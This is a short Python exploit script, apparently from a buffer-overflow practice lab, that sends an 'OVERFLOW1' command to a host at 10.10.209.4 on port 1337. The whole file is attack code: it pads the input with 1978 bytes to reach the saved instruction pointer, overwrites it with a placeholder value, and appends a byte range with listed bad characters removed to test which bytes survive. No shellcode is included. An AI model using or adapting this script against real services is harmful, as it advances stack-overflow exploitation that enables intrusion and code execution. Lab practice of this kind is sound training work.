#!/usr/bin/env python3

import socket

host, port = "10.10.209.4", 1337

all_chars = bytearray(range(1,256))

bad_chars = [
	b"\x07",
	b"\x2d",
	b"\x2e",
	b"\xa0",
]

for bad_char in bad_chars:
	all_chars = all_chars.replace(bad_char, b"")

command = b"OVERFLOW1 "
length = 5000
offset = 1978
new_eip = b"BBBB"

payload = b"".join([
	command,
	b"A" * offset,
	new_eip,
	all_chars,
	b"C" * ( length - len(new_eip) - offset - len(all_chars)),
])

with socket.socket() as s:
	s.connect((host, port))
	# banner = s.recv(4096).decode("utf-8").strip()
	s.send(payload)